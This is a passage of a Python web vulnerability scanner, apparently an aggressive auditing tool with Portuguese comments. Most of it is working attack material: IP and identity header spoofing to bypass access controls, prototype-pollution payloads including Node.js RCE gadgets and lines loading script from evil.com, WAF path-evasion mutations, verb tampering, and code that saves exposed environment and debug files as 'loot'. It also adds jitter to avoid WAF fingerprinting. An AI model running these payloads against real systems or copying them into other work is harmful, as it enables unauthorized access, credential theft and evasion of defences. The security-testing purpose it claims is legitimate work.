            "/api/v1/query": ["resultType", "metric"],
            "/v1/agent/self": ["Config", "Member"], # Consul
            "/v1/sys/health": ["initialized", "sealed"], # HashiCorp Vault
            
            # 📄 Logs & Dev Artifacts
            "/npm-debug.log": ["npm info", "err"],
            "/yarn-error.log": ["Arguments:", "Trace:"],
            "/composer.lock": ["content-hash", "packages"],
            "/package-lock.json": ["lockfileVersion", "dependencies"],
            "/.vscode/settings.json": ["terminal.integrated", "editor"],
            "/.idea/workspace.xml": ["component", "project"],
        }

        # --- [AMPLIFICAÇÃO DE BYPASS: ADVANCED SPOOFING] ---
        # Adicionamos variações de rede interna e IPv6 para confundir filtros de ACL
        bypass_headers = {
            # IPv4 Localhost Spoofing
            "X-Forwarded-For": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
            "Client-IP": "127.0.0.1",
            
            # IPv6 Localhost (Muitos WAFs esquecem de filtrar o loopback v6)
            "X-Forwarded-For": "::1",
            "X-Real-IP": "::1",
            
            # Internal Network Range Spoofing (Tentando passar como IP da LAN)
            "X-Forwarded-For": "10.0.0.1, 192.168.1.1, 172.16.0.1",
            
            # Headers Específicos de Proxy/Gateway
            "X-Custom-IP-Authorization": "127.0.0.1",
            "CF-Connecting-IP": "127.0.0.1", # Cloudflare bypass attempt
            "X-Cluster-Client-IP": "127.0.0.1",
        }

        for path, signatures in debug_targets.items():
            target_url = f"{base_url}{path}"
            try:
                OmniValidator.show_payload(f"Debug Hunt: {path}")
                
                # Mesclamos headers padrão com os de bypass
                current_headers = OmniValidator.get_headers()
                current_headers.update(bypass_headers)

                res = requests.get(target_url, headers=current_headers, timeout=5, verify=False)

                if res.status_code == 200:
                    content_snippet = res.text[:5000] # Analisa apenas o início para performance
                    
                    if any(sig in content_snippet for sig in signatures):
                        severity = "CRITICAL" if any(x in path for x in ["console", "debugger", "heapdump", "env"]) else "HIGH"
                        
                        findings.append({
                            "msg": f"💀 DEBUG/ENV EXPOSTO: {path}",
                            "severity": severity,
                            "cvss": 9.8 if severity == "CRITICAL" else 8.5,
                            "details": f"Assinatura detectada: {[s for s in signatures if s in content_snippet][0]}"
                        })

                        # --- [AUTO-EXFILTRATION] ---
                        # Se for um heapdump, não salvamos no log (pode ter GBs), apenas notificamos
                        if "heapdump" in path:
                            findings.append({"msg": "📦 HeapDump detectado! Baixe manualmente para extrair senhas da RAM.", "severity": "CRITICAL"})
                        else:
                            # Salva o loot de debug
                            host = urlparse(url).netloc
                            loot_file = os.path.join(LOOT_DIR, f"{host}_debug_{path.replace('/','_')}.txt")
                            with open(loot_file, "w", encoding="utf-8") as f:
                                f.write(res.text)

            except Exception:
                continue

        return findings

# --- [8] MÓDULO: IDOR & BOLA ADVANCED (ELITE VERSION) ---
    @staticmethod
    def validate_idor_advanced(url):
        """
        MOTOR DE IDENTIDADE AGRESSIVO:
        - Header-Based Identity Spoofing (BOLA).
        - UUID vs Integer Fuzzing (Escala de Identidade).
        - HTTP Parameter Pollution (HPP) para Bypass de Autorização.
        - Analise Diferencial de Resposta (Content-Length Variation).
        """
        findings = []
        domain = urlparse(url).netloc
        
        # 1. HEADER-BASED IDENTITY SPOOFING (Dicionário Amplificado)
        # --- [AMPLIFICAÇÃO MASSIVA DE HEADERS DE IDENTIDADE E BYPASS] ---
        identity_headers = {
            # 🏢 Standard & Legacy Systems
            "X-User-ID": "1", "X-Customer-ID": "1", "X-Client-ID": "1",
            "X-Admin-ID": "1", "X-UID": "1", "User-ID": "1", "Auth-User-ID": "1",
            "X-Profile-ID": "1", "X-Account-ID": "1", "X-Member-ID": "1",
            
            # 🕸️ Microservices & API Gateways (Istio, Kong, Apigee)
            "X-Authenticated-Userid": "1",
            "X-Authenticated-Scope": "admin",
            "X-Authenticated-Groups": "admin",
            "X-Authenticated-Role": "admin",
            "X-Proxy-User-Id": "1",
            "X-Gateway-User-ID": "1",
            "X-Istio-Attributes": "eyAiYXV0aF91c2VyIjogIjEiIH0=", # Base64 spoofing
            "X-Kong-Jwt-Payload": "eyAiYWRtaW4iOiB0cnVlIH0=", 
            
            # 🛡️ Impersonation & Debugging (Headers de "Sudo")
            "X-Impersonate-User": "1",
            "X-Impersonate-Role": "admin",
            "X-Impersonate-Group": "sudo",
            "X-Override-User": "1",
            "X-Substitute-User": "1",
            "X-Run-As": "admin",
            "X-Sudo-User": "1",
            
            # ☁️ Cloud & Serverless Context (AWS/Azure/GCP)
            "X-Appengine-User-Id": "1",
            "X-Amzn-Oidc-Data": "SPOOFED_DATA",
            "X-Amzn-Oidc-Identity": "1",
            "X-MS-Client-Principal-Id": "1",
            "X-MS-Client-Principal-Name": "admin",
            
            # 🔄 Proxy-Auth & Cache Inheritance
            "X-Forwarded-User": "admin",
            "X-Forwarded-Email": "admin@localhost",
            "X-Original-User": "admin",
            "X-Remote-User": "admin",
            "X-Remote-User-ID": "1",
            "Forwarded-User": "admin",
            
            # 🔑 JWT & Token Headers (Injeção de Header de Atributo)
            "X-JWT-Assertion": "SPOOFED_TOKEN",
            "X-Access-Token": "1",
            "X-Auth-Token": "1"
        }

        # Baseline para comparação (Resposta sem modificação)
        baseline = OmniValidator.request_with_retry(url)
        base_len = len(baseline.text) if baseline else 0

        # Teste de Headers de Identidade
        for h, v in identity_headers.items():
            try:
                res = OmniValidator.request_with_retry(url, headers={h: v})
                if res and res.status_code == 200:
                    # Comparação Heurística: se o tamanho da resposta mudar significativamente
                    # ou se palavras-chave de 'perfil' aparecerem, há indício de IDOR.
                    res_text = res.text.lower()
                    if len(res.text) != base_len and any(word in res_text for word in ["email", "address", "uuid", "role", "admin"]):
                        findings.append({
                            "msg": f"🎯 BOLA/IDOR Confirmado em Header: {h}",
                            "severity": "CRITICAL",
                            "cvss": 9.4,
                            "vector": f"{h}: {v}"
                        })
            except: continue

        # 2. PARAMETER POLLUTION & OVERRIDE (HPP)
        # Tenta injetar parâmetros extras para confundir o parser do backend
        # Ex: ?user_id=meu_id&user_id=1
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if params:
            for p in params.keys():
                # Injeta um segundo parâmetro com ID comum (1 ou 0)
                polluted_url = f"{url}&{p}=1&{p}=0&admin=true"
                res_hpp = OmniValidator.request_with_retry(polluted_url)
                if res_hpp and res_hpp.status_code == 200 and len(res_hpp.text) != base_len:
                    findings.append({
                        "msg": f"🛰️ IDOR via Parameter Pollution: {p}",
                        "severity": "HIGH",
                        "cvss": 8.8
                    })

        # 3. HTTP VERB TAMPERING (Bypass de Middleware)
        # Se um GET é bloqueado, tentamos o mesmo recurso com POST ou PUT
        # para ver se o middleware de autorização só protege o método original.
        verbs = ["POST", "PUT", "PATCH", "DELETE"]
        for v in verbs:
            try:
                # Alguns servidores aceitam mudar o verbo via Header se o método real for bloqueado
                headers = {"X-HTTP-Method-Override": v}
                res_verb = requests.request(v, url, headers=headers, timeout=5, verify=False)
                if res_verb.status_code == 200 and len(res_verb.text) > base_len:
                    findings.append({
                        "msg": f"⚡ Authorization Bypass via Verb Tampering ({v})",
                        "severity": "HIGH",
                        "cvss": 8.1
                    })
            except: continue

        return findings

# --- [9] MÓDULO: PROTOTYPE POLLUTION & JS LOGIC BREACH ---
    @staticmethod
    def validate_modern_js_bugs(url):
        """
        MOTOR DE INJEÇÃO DE PROTÓTIPO:
        - Poluição via Query String, Hash e JSON Body.
        - Fuzzing de Gadgets (Polluted Property Reflection).
        - Teste de Server-Side Prototype Pollution (SSPP) para RCE.
        - Bypass de bibliotecas de merge (lodash, extend).
        """
        findings = []
        base_url = url.split('?')[0]
        
        # --- [AMPLIFICAÇÃO MASSIVA DE PAYLOADS DE PROTOTYPE POLLUTION] ---
        pp_payloads = [
            # 1. Standard & Constructor Bypass (Burlas de filtros de string simples)
            "__proto__[omni_polluted]=true",
            "constructor[prototype][omni_polluted]=true",
            "constructor.prototype.omni_polluted=true",
            "__proto__.omni_polluted=true",
            
            # 2. Nested & Array Pollution (Explora falhas de recursão em deep merge)
            "__proto__[omni_polluted][test]=true",
            "__proto__.omni_polluted.test=true",
            "__proto__[]=omni_polluted",
            "__proto__[0]=omni_polluted",
            
            # 3. Unicode & Encoding Bypass (Para enganar WAFs que não decodificam tudo)
            "__pro\u0074o__[omni_polluted]=true",
            "__pr%6f%74o__[omni_polluted]=true", # URL Encoded
            "__proto__%5bomni_polluted%5d=true",
            "constructor%5bprototype%5d%5bomni_polluted%5d=true",
            
            # 4. Logic & PrivEsc Payloads (Tentativas de escalar privilégios)
            "__proto__[isAdmin]=true",
            "__proto__[admin]=1",
            "__proto__[role]=admin",
            "__proto__[privileges]=all",
            "__proto__[authenticated]=true",
            "__proto__[whitelist]=true",
            
            # 5. RCE GADGETS - Node.js Specific (Exploração de exec, spawn e fork)
            "__proto__[shell]=node",
            "__proto__[NODE_OPTIONS]=--inspect",
            "__proto__[argv0]=node",
            "__proto__[exports][.]=./main.js",
            "__proto__[sourceURL]=http://evil.com/xss.js", # Client-side XSS Gadget
            
            # 6. Hash & Fragment Pollution (Client-side specific)
            "#__proto__[omni_polluted]=true",
            "#__proto__.omni_polluted=true",
            "#!__proto__[omni_polluted]=true",
            
            # 7. Malformed JSON Body (Para testes via POST/PUT em APIs)
            '{"__proto__":{"omni_polluted":true}}',
            '{"constructor":{"prototype":{"omni_polluted":true}}}',
            '{"__proto__":{"data":"polluted","sourceURL":"javascript:alert(1)"}}'
        ]

        # 2. CLIENT-SIDE & SERVER-SIDE REFLECTION
        for payload in pp_payloads:
            try:
                # Teste via GET (Query/Hash)
                target = f"{base_url}?{payload}" if "?" not in payload else f"{base_url}{payload}"
                res = OmniValidator.request_with_retry(target, timeout=5)
                
                if res and "omni_polluted" in res.text:
                    findings.append({
                        "msg": "☣️ Prototype Pollution Detectado (Reflection)",
                        "severity": "HIGH",
                        "cvss": 8.2,
                        "payload": payload
                    })

                # 3. SERVER-SIDE JSON POLLUTION (POST/PUT)
                # --- [AMPLIFICAÇÃO AGRESSIVA DE JSON PAYLOADS PARA POST/PUT] ---
                json_payloads = [
                    # 1. Standard & Hidden Property Injection
                    {"__proto__": {"omni_polluted": True, "isAdmin": True, "role": "admin"}},
                    {"constructor": {"prototype": {"omni_polluted": True, "authenticated": True}}},

                    # 2. RCE GADGETS: Node.js / Process Poisoning
                    {"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect-brk=0.0.0.0:1337"}},
                    {"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}},
                    {"__proto__": {"argv0": "/usr/bin/node", "execPath": "/bin/sh"}},
                    
                    # 3. TEMPLATE ENGINE EXPLOITATION (EJS, Handlebars, Pug)
                    {"__proto__": {"client": True, "escape": "function(t){return t;}"}}, # EJS Bypass
                    {"__proto__": {"sourceURL": "http://evil.com/rce.js"}},
                    {"__proto__": {"layout": False, "view options": {"pretty": True}}},

                    # 4. DATA POISONING & VALIDATION BYPASS
                    {"__proto__": {"whitelist": ["127.0.0.1", "0.0.0.0"], "ignore_auth": True}},
                    {"__proto__": {"verify": False, "allow_undefined": True}},
                    
                    # 5. DOS (DENIAL OF SERVICE) VIA PROTOTYPE
                    {"__proto__": {"toString": "POISONED", "valueOf": "POISONED"}},
                    
                    # 6. NESTED & ARRAY MERGE BYPASS
                    {"__proto__": {"omni": {"nested": {"polluted": True}}}},
                    {"constructor": {"prototype": {"config": {"debug": True}}}}
                ]

                for j_pay in json_payloads:
                    res_json = requests.post(base_url, json=j_pay, headers=OmniValidator.get_headers(), timeout=5, verify=False)
                    if res_json.status_code == 200 and "omni_polluted" in res_json.text:
                        findings.append({
                            "msg": "💀 SERVER-SIDE Prototype Pollution (SSPP)",
                            "severity": "CRITICAL",
                            "cvss": 9.8,
                            "details": "Possível escalonamento de privilégios ou RCE via Gadgets"
                        })
            except: continue

        # 4. GADGET SCANNING (Bypass de Sanitização)
        gadget_url = f"{base_url}?__proto__[sourceURL]=http://evil.com/xss.js&__proto__[layout]=false"
        try:
            res_gadget = OmniValidator.request_with_retry(gadget_url)
            if res_gadget and res_gadget.status_code == 200:
                if "sourceURL" in res_gadget.text:
                    findings.append({"msg": "🚀 PP Gadget Found: Potential RCE/XSS via Prototype", "severity": "HIGH"})
        except: pass

        return findings

# --- [11] MÓDULO: AGGRESSIVE WAF BYPASS & PROTOCOL SMUGGLING ---
    @staticmethod
    def validate_waf_bypass_aggressive(url):
        """
        MOTOR DE EVASÃO TERMINAL:
        - Path Deception (Normalização de Nginx/Tomcat/IIS).
        - Double & Triple Encoding (Bypass de Inspeção de String).
        - Unicode/UTF-8 Homograph Attacks em Paths.
        - Header Smuggling para enganar ACLs de IP.
        """
        findings = []
        parsed = urlparse(url)
        path = parsed.path if parsed.path else "/"
        host = parsed.netloc
        base_url = f"{parsed.scheme}://{host}"

        # --- [AMPLIFICAÇÃO SUPREMA DE HEADERS PARA BYPASS DE ACL E WAF] ---
        bypass_headers = [
            # 1. IP SPOOFING CLÁSSICO (Variantes de Loopback e Rede Interna)
            {"X-Forwarded-For": "127.0.0.1"}, {"X-Forwarded-For": "::1"},
            {"X-Forwarded-For": "10.0.0.1"}, {"X-Forwarded-For": "172.16.0.1"},
            {"X-Forwarded-For": "192.168.1.1"}, {"X-Forwarded-For": "localhost"},
            
            # 2. IDENTIDADE DE PROXY E GATEWAY (Explora confiança em nós vizinhos)
            {"X-Real-IP": "127.0.0.1"}, {"X-Remote-Addr": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"}, {"X-Client-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"}, {"Client-IP": "127.0.0.1"},
            {"X-ProxyUser-Ip": "127.0.0.1"}, {"X-Originating-IP": "127.0.0.1"},
            {"Cluster-Client-IP": "127.0.0.1"}, {"X-Cluster-Client-IP": "127.0.0.1"},
            {"X-Proxy-ID": "127.0.0.1"}, {"Via": "127.0.0.1"},
            
            # 3. ROUTING & REWRITE DECEPTION (Engana o roteamento do WAF vs Backend)
            {"X-Original-URL": path}, {"X-Rewrite-URL": path},
            {"X-Forwarded-Server": "localhost"}, {"X-Forwarded-Host": "localhost"},
            {"X-Host": "localhost"}, {"Host": "localhost"},
            {"X-Forwarded-Proto": "http"}, # Força downgrade de segurança se mal configurado
            {"X-Forwarded-Scheme": "http"},
            
            # 4. CLOUD & GATEWAY SPECIFIC (Headers que "abrem portas" em nuvens específicas)
            {"CF-Connecting-IP": "127.0.0.1"},    # Cloudflare
            {"X-Azure-ClientIP": "127.0.0.1"},    # Azure
            {"X-AppEngine-Remote-Addr": "127.0.0.1"}, # Google Cloud
            {"X-Amz-Cf-Id": "127.0.0.1"},         # AWS CloudFront
            {"Forwarded": "for=127.0.0.1;proto=http;by=127.0.0.1"}, # RFC 7239
            
            # 5. AUTHENTICATION & ACL BYPASS (Headers de confiança de admin)
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Authenticated-User-ID": "1"},
            {"X-Admin": "true"},
            {"X-User-Role": "admin"},
            {"X-Original-IP": "127.0.0.1"},
            {"X-Remote-User": "admin"}
        ]

        # 2. ESTRATÉGIAS DE EVASÃO DE PATH (MUTAÇÕES AGRESSIVAS)
        # --- [AMPLIFICAÇÃO SUPREMA DE EVASÃO E BYPASS] ---
        evasion_paths = [
            # 1. SEGMENTAÇÃO E DELIMITADORES (Explora falhas de State Machine de WAFs)
            f"/{path}/.", f"/{path}/./", f"/{path}/..;/", f"/{path}/..;/{path}",
            f"/{path}/%20/", f"/{path}/%09/", f"/{path}/%0d/", f"/{path}/%0a/",
            f"/{path}/#", f"/{path}/?/", f"/{path}/%23", f"/{path}/..%ff/",
            f"/{path}/..%2f", f"/{path}/..%5c", # Backslash bypass (Windows/IIS)
            
            # 2. DOUBLE & TRIPLE URL ENCODING (Deep Inspection Bypass)
            path.replace("/", "%252f"),       # Double (/)
            path.replace("/", "%25252f"),     # Triple (/)
            path.replace(".", "%252e"),       # Double (.)
            f"{path}%2500",                   # Double Null Byte
            
            # 3. UNICODE & MULTIBYTE NORMALIZATION (Bypass de Charset)
            # Tenta forçar o servidor a converter caracteres Unicode para ASCII após o WAF ler
            path.replace("a", "%u0061"),      # Unicode encoding (IIS)
            path.replace("s", "%u0073"),
            path.replace("/", "%c0%af"),      # Overlong UTF-8 (/)
            path.replace(".", "%c0%2e"),      # Overlong UTF-8 (.)
            path.replace("e", "%e2%84%ae"),   # Unicode character similar a 'e' (Kelvin Sign)
            
            # 4. PATH OVERFLOW & JUNK DATA (Buffer Exhaustion)
            f"{path}/" + ("A" * 2048),         # Long Path (Confunde WAFs com buffers pequenos)
            f"{path}/" + ("./" * 512),         # Recursive Dot Normalization
            
            # 5. PARAMETER POLLUTION & OVERRIDE NO PATH
            f"{path};jsessionid=1234",         # Matrix Parameter (Tomcat/Java)
            f"{path}?_method=GET",             # Method Override via Query
            f"{path}?%00",                     # Null byte no início da query
            f"{path}?.php",                    # Extensão falsa via query
            f"{path}/index.php/config.env",    # PATH_INFO exploitation
            
            # 6. PROTOCOL-SPECIFIC (Nginx, Apache, IIS)
            f"/{path}/_/",                     # Nginx internal redirect bypass
            f"/{path}%20/",                    # Apache trailing space
            f"{path}.aspx",                    # Spoofing de extensão (IIS)
            f"{path}%80",                      # Invalid UTF-8 sequence
        ]

        # 3. TESTE DE VERB TUNNELING E SMUGGLING (CABEÇALHOS AGRESSIVOS)
        # Tenta esconder o método real do WAF usando técnicas de encapsulamento
        verb_overrides_headers = [
            # Headers de Túnel (Engana o roteamento de API Gateways)
            {"X-HTTP-Method": "PUT"},
            {"X-HTTP-Method-Override": "PUT"},
            {"X-Method-Override": "PUT"},
            {"X-HTTP-Method-Override": "DELETE"},
            {"X-Original-Method": "GET"},
            
            # Protocol Smuggling - Hop-by-Hop (Injeção em nível de conexão)
            {"Connection": "keep-alive, X-overridden-method"},
            {"X-overridden-method": "PUT"},
            
            # Content-Type Confusion
            {"Content-Type": "application/x-www-form-urlencoded; charset=utf-7"},
            {"Content-Type": "application/json; charset=ibm866"}
        ]

        # 3. TESTE DE VERB TUNNELING (Bypass de Filtro de Método)
        # Se GET /admin é 403, talvez POST /admin com X-HTTP-Method-Override seja 200
        verb_overrides = ["PUT", "PATCH", "DEBUG", "TRACE", "TRACK"]

        # EXECUÇÃO: HEADERS
        for head in bypass_headers:
            try:
                # Baseline para comparação
                res = requests.get(base_url + path, headers={**OmniValidator.get_headers(), **head}, timeout=5, verify=False)
                if res.status_code == 200 and "Forbidden" not in res.text:
                    findings.append({
                        "msg": f"🔓 WAF BYPASS: Header {list(head.keys())[0]}",
                        "severity": "CRITICAL", "cvss": 9.1,
                        "technique": "IP/Host Spoofing"
                    })
            except: continue

        # EXECUÇÃO: EVASÃO DE PATH
        for ep in set(evasion_paths):
            try:
                target = f"{base_url.rstrip('/')}/{ep.lstrip('/')}"
                res = requests.get(target, headers=OmniValidator.get_headers(), timeout=5, verify=False)
                if res.status_code == 200 and len(res.text) > 0:
                    findings.append({
                        "msg": f"🛡️ 403 EVASION: {ep}",
                        "severity": "HIGH", "cvss": 8.7,
                        "technique": "Path Normalization Deception"
                    })
            except: continue

        # EXECUÇÃO: VERB TUNNELING
        for verb in verb_overrides:
            try:
                headers = {**OmniValidator.get_headers(), "X-HTTP-Method-Override": verb}
                res = requests.post(base_url + path, headers=headers, timeout=5, verify=False)
                if res.status_code == 200:
                    findings.append({
                        "msg": f"⚡ WAF BYPASS via Verb Override: {verb}",
                        "severity": "HIGH", "cvss": 8.1
                    })
            except: continue

        return findings

    # --- [12] MÓDULO: SUPPLY CHAIN & DEPENDENCY CONFUSION (ULTRA-EXTERMINATUS) ---
    @staticmethod
    def validate_dependency_confusion_extreme(url, text_content):
        """
        MOTOR DE INTELIGÊNCIA DE CADEIA DE SUPRIMENTOS:
        - Varredura Multilinguagem (JS, Py, Ruby, PHP, Go, Rust, .NET, Docker).
        - Detecção de Namespaces Órfãos (Scoped Packages).
        - Verificação de Hijacking em Registros Públicos vs Privados.
        - Identificação de Módulos de Infraestrutura (Terraform/Docker).
        """
        findings = []
        domain_parts = [p for p in urlparse(url).netloc.split('.') if len(p) > 3]
        
        # 1. REGISTROS TÉCNICOS EXPANDIDOS
        registries = {
            "NPM": "https://registry.npmjs.org/{}",
            "PyPI": "https://pypi.org/pypi/{}/json",
            "RubyGems": "https://rubygems.org/api/v1/gems/{}.json",
            "Packagist": "https://packagist.org/packages/{}.json",
            "Crates.io": "https://crates.io/api/v1/crates/{}",
            "NuGet": "https://api.nuget.org/v3-flatcontainer/{}/index.json",
            "GoProxy": "https://proxy.golang.org/{}/@v/list",
            "DockerHub": "https://hub.docker.com/v2/repositories/{}/"
        }

        # 2. PADRÕES DE EXTRAÇÃO DE ALTA PRECISÃO
        dep_patterns = [
            r'"((?:@[a-z0-9-~][a-z0-9-._~]*\/)?[a-z0-9-~][a-z0-9-._~]*)"\s*:\s*"[^"]*"', # Scoped NPM/JSON
            r'^([a-zA-Z0-9\-_]+)\s*(?:==|>=|<=|~=|>|<|@)',                           # Pip/Requirements
            r"gem\s+['\"]([^'\"]+)['\"]",                                            # Ruby Gems
            r'source\s*=\s*["\']([^"\']+)["\']',                                     # Terraform Modules
            r'FROM\s+([a-z0-9\-_]+\/[a-z0-9\-_]+)',                                   # Docker Namespaces
            r'import\s+.*\s+from\s+["\']([^"\']+)["\']'                              # ES6 Imports
        ]

        # 3. FILTRAGEM DE RUÍDO (WHITELIST DE GIGANTES)
        noise_reduction = ['react', 'lodash', 'express', 'requests', 'flask', 'django', 'aws-sdk', 'bootstrap']

        unique_pkgs = set()
        for pattern in dep_patterns:
            unique_pkgs.update(re.findall(pattern, text_content, re.MULTILINE | re.IGNORECASE))

        for pkg in unique_pkgs:
            if any(common in pkg.lower() for common in noise_reduction):
                continue

            for reg_name, reg_url in registries.items():
                try:
                    # Normalização para Go e Docker
                    check_pkg = pkg.replace('/', '%2f') if reg_name == "GoProxy" else pkg
                    res = requests.get(reg_url.format(check_pkg), timeout=5, verify=False)

                    if res.status_code == 404:
                        # HEURÍSTICA DE IMPACTO: O pacote contém o nome da empresa/domínio?
                        is_likely_internal = any(part in pkg.lower() for part in domain_parts)
                        
                        # VERIFICAÇÃO DE SCOPE (@org/package)
                        is_scoped = pkg.startswith('@')
                        
                        severity = "CRITICAL" if (is_likely_internal or is_scoped) else "HIGH"
                        cvss = 9.8 if is_likely_internal else 8.5

                        findings.append({
                            "msg": f"💀 {reg_name} HIJACKING: '{pkg}'",
                            "severity": severity,
                            "cvss": cvss,
                            "details": f"Pacote interno/privado livre para registro no {reg_name}. Risco de RCE via update."
                        })
                        break # Encontrou vazamento em um registro, pula para o próximo pacote
                except: continue

        return findings

class AuditorCore:
    lock = threading.Lock()
    total_tasks = 0
    done_tasks = 0
    found_count = 0
    start_time = None
    current_subphase = "INICIALIZANDO"

    # [MELHORIA 1 & 2] - Estruturas de controle
    processed_dirs = set()
    reported_vulns_hashes = set() # Impede spam de vulnerabilidades idênticas

    @staticmethod
    def generate_dashboard(report_data):
        html_template = """
        <!DOCTYPE html><html><head><title>OMEGA-X DASHBOARD</title>
        <style>
            body {{ background: #0a0a0a; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, sans-serif; padding: 30px; line-height: 1.6; }}
            h1 {{ color: #ff003c; border-bottom: 2px solid #ff003c; padding-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; }}
            .stats-container {{ margin-bottom: 30px; }}
            .card {{ background: #1a1a1a; padding: 20px; margin-right: 15px; border-radius: 8px; border-left: 5px solid #ff003c; display: inline-block; min-width: 150px; box-shadow: 0 4px 15px rgba(255, 0, 60, 0.1); }}
            .card h3 {{ margin: 0; font-size: 0.8em; color: #888; }}
            .card p {{ margin: 5px 0 0; font-size: 1.8em; font-weight: bold; color: #fff; }}
            table {{ width: 100%; border-collapse: separate; border-spacing: 0; margin-top: 20px; border-radius: 8px; overflow: hidden; }}
            th {{ background: #222; color: #ff003c; padding: 15px; text-align: left; text-transform: uppercase; font-size: 0.9em; }}
            td {{ padding: 12px 15px; border-bottom: 1px solid #222; background: #111; font-size: 0.95em; }}
            tr:hover td {{ background: #161616; }}
            .sev-CRITICAL {{ color: #ff003c; font-weight: bold; text-shadow: 0 0 10px rgba(255, 0, 60, 0.5); }}
            .sev-HIGH {{ color: #ff8000; font-weight: bold; }}
            .sev-MEDIUM {{ color: #ffcc00; }}
            .url-link {{ color: #44aaff; text-decoration: none; font-family: monospace; font-size: 0.9em; }}
        </style></head><body>
        <h1>🚀 Omega-X Exterminatus Report</h1>
        <div class="stats-container">
            <div class="card"><h3>VULNERABILIDADES</h3><p>{total_vuls}</p></div>
            <div class="card"><h3>ALVOS ÚNICOS</h3><p>{total_targets}</p></div>
        </div>
        <table><thead><tr><th>ID</th><th>Severity</th><th>Vulnerability</th><th>Target URL</th></tr></thead>
        <tbody>{rows}</tbody></table></body></html>
        """
        rows = ""
        v_count = 0
        seen_in_dashboard = set() # Deduplicação final na geração do HTML

        for entry in report_data:
            for v in entry['vulnerabilities']:
                # Gerar um hash único para a falha (Tipo + Mensagem) para evitar duplicatas visuais
                vuln_signature = hashlib.md5(f"{v['severity']}{v['msg']}".encode()).hexdigest()
                
                if vuln_signature in seen_in_dashboard:
                    continue
                
                seen_in_dashboard.add(vuln_signature)
                v_count += 1
                rows += (f"<tr><td>{entry['id']}</td>"
                        f"<td class='sev-{v['severity']}'>{v['severity']}</td>"
                        f"<td>{v['msg']}</td>"
                        f"<td><a class='url-link' href='{entry['url']}' target='_blank'>{entry['url']}</a></td></tr>")

        final_html = html_template.format(total_vuls=v_count, total_targets=len(report_data), rows=rows)
        with open(DASHBOARD_HTML, "w", encoding="utf-8") as f: 
            f.write(final_html)

    @staticmethod
    def get_headers():
        # [MELHORIA 2] - Rotação Dinâmica de Headers
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1"
        }

    @staticmethod
    def process_task(fid, block, update_ui_func):
        """
        ORQUESTRADOR OMNI-VALIDATOR EXTERMINATUS:
        - Execução em Pipeline Multi-Estágio (Cyber Kill Chain).
        - Motor de Correlação Heurística (Encadeamento de falhas).
        - Validação Ativa de Identidade (AWS, Github, Azure, etc).
        - Sistema de Evasão Adaptativo com Jitter.
        """
        try:
            url = ""
            for line in block:
                if "URL]" in line: url = line.split("URL]")[1].strip()
            if not url: return None

            # 1. GOVERNANÇA E FILTRO DE ESCOPO
            if not SecurityPolicy.is_in_scope(url):
                return None

            # 2. INTELIGÊNCIA DE CONTEXTO E DEDUPLICAÇÃO
            domain = urlparse(url).netloc
            path_parts = urlparse(url).path.split('/')
            # Define o diretório pai (ex: /api/v1/user -> /api/v1)
            parent_dir = "/".join(path_parts[:-1]) if len(path_parts) > 1 else "/"
            dir_key = f"{domain}{parent_dir}"

            # Verifica se já fizemos o fuzzing pesado nesta pasta
            is_redundant_dir = False
            with AuditorCore.lock:
                if dir_key in AuditorCore.processed_dirs:
                    is_redundant_dir = True
                else:
                    AuditorCore.processed_dirs.add(dir_key)

            base_url = url.split("?")[0]
            
            # Delay Adaptativo (Jitter) para evitar fingerprinting de WAF
            SecurityPolicy.apply_delay(url, seconds=random.uniform(1.0, 2.5))

            results = []

            # --- [FUNÇÃO INTERNA: EXECUÇÃO COM ISOLAMENTO E TIMEOUT] ---
            def run_advanced(func, *args, name=""):
                try:
                    return func(*args) or []
                except Exception:
                    return []

            def set_phase(new_phase, color="\033[1;34m"):
                AuditorCore.current_subphase = new_phase
                update_ui_func(AuditorCore.done_tasks, AuditorCore.total_tasks, f"{color}{new_phase}\033[0m")

            # --- [ESTÁGIO 1: RECON & SUPPLY CHAIN] ---
            set_phase("SUPPLY CHAIN RECON")
            main_res = OmniValidator.request_with_retry(base_url, timeout=7)
            if main_res:
                # Fusão extrema do Módulo 12 (Dependency Confusion)
                results.extend(run_advanced(OmniValidator.validate_dependency_confusion_extreme, base_url, main_res.text, name="SupplyChain"))

            # --- [ESTÁGIO 2: ELITE FUZZING & ESTRUTURA] ---
            # SÓ RODA O FUZZING PESADO SE O DIRETÓRIO FOR NOVO
            if not is_redundant_dir:
                set_phase("ELITE FUZZING", "\033[1;35m")
                results.extend(run_advanced(OmniValidator.elite_path_fuzz, base_url, name="PathFuzz"))
                results.extend(run_advanced(OmniValidator.force_debug_env_exposure, base_url, name="EnvExposure"))
            else:
                # Se for redundante, apenas logamos internamente ou pulamos para poupar banda
                pass

            # JS Scanner roda sempre, pois cada arquivo JS pode ter uma chave diferente
            set_phase("JS DEEP SCAN", "\033[1;36m")
            results.extend(run_advanced(OmniValidator.deep_js_scanner, base_url, name="JSScanner"))

            # --- [ESTÁGIO 3: PERIMETER BYPASS & CACHE] ---
            # WAF Bypass e Cache Poisoning costumam ser por infra (IP/Domínio), 
            # então também podemos otimizar se já testamos a pasta
            if not is_redundant_dir:
                set_phase("PERIMETER BYPASS", "\033[1;31m")
                results.extend(run_advanced(OmniValidator.validate_waf_bypass_aggressive, base_url, name="WAFBypass"))
                results.extend(run_advanced(OmniValidator.validate_cache_poisoning, base_url, name="WebCache"))
            
            # CORS deve ser testado por URL/Endpoint
            results.extend(run_advanced(OmniValidator.validate_access_control, url, domain, name="CORS"))

            # --- [ESTÁGIO 4: INJEÇÃO E ESTADO (SE HOUVER PARÂMETROS)] ---
            if "?" in url:
                set_phase("INJECTION & IDOR", "\033[1;91m")
                param = url.split("?")[1].split("=")[0]
                results.extend(run_advanced(OmniValidator.validate_idor_advanced, url, name="IDOR"))
